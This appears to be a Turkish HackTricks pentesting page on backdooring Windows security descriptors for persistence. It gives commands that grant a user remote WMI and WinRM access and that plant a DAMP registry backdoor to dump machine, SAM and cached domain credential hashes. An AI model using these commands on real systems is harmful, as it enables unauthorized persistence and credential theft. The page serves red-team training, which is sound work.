# Güvenlik Tanımlayıcıları

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Güvenlik Tanımlayıcıları

[Dökümantasyondan](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını açıklamak için kullanılan formattır. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_türü;ace_bayrakları;izinler;nesne_kılavuzu;miras_alınan_nesne_kılavuzu;hesap_sid;`

**Güvenlik tanımlayıcıları**, bir **nesnenin** üzerinde **sahip olduğu izinleri** depolamak için kullanılır. Bir nesnenin güvenlik tanımlayıcısında sadece küçük bir değişiklik yapabilirseniz, ayrıcalıklı bir gruba üye olmadan o nesne üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz.

Bu kalıcılık tekniği, genellikle yönetici ayrıcalıklarını gerektiren bir görevi yönetici olmadan gerçekleştirebilmek için belirli nesneler üzerinde gereken her ayrıcalığı kazanma yeteneğine dayanır.

### WMI Erişimi

Bir kullanıcıya **uzaktan WMI yürütme erişimi** sağlayabilirsiniz [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM Erişimi

Bir kullanıcıya **winrm PS konsoluna erişim** sağlamak için [**şunu kullanın**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hash'lerin Uzaktan Erişimi

**Kayıt defterine** erişin ve **hash'leri dökün**, [**DAMP**](https://github.com/HarmJ0y/DAMP) kullanarak bir **Reg arka kapısı oluşturun**, böylece herhangi bir zamanda **bilgisayarın hash'ini**, **SAM**'i ve bilgisayarda önbelleğe alınmış herhangi bir **AD kimlik bilgisini** alabilirsiniz. Bu nedenle, bu izni bir **düzenli kullanıcıya** bir **Etki Alanı Denetleyici bilgisayarı** karşısında vermek çok faydalıdır:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
**Güvenlik Tanımlayıcıları**

Bir Etki Alanı Denetleyicisinin bilgisayar hesabının karma değerini nasıl kullanabileceğinizi öğrenmek için [**Gümüş Biletler**](silver-ticket.md)'e bakın.

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
